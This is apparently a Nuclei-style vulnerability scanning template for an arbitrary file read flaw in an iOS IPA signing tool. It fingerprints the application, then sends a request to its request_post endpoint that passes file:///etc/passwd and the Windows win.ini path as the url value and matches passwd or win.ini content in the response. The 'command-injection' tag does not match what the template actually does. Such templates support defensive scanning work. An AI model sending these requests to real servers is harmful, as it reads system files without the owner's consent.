id: poc-yaml-iso-ipa-request-post-fileread

info:
  name: 苹果IOS端IPA签名工具 request_post 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: command-injection, file-read
  description: |
    This template detects arbitrary file read vulnerabilities in 苹果IOS端IPA签名工具 via the request_post API endpoint.

variables:
  r_data_linux:
    - "file:///etc/passwd"
    - "file:///c://windows/win.ini"

http:
  - method: GET
    path:
      - "/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "/assets/index/css/mobileSelect.css"

  - method: GET
    path:
      - "/api/index/request_post?url={{r_data_linux}}&post_data=1"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and
      - type: regex
        regex:
          - "root:.*:0:0:"
    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
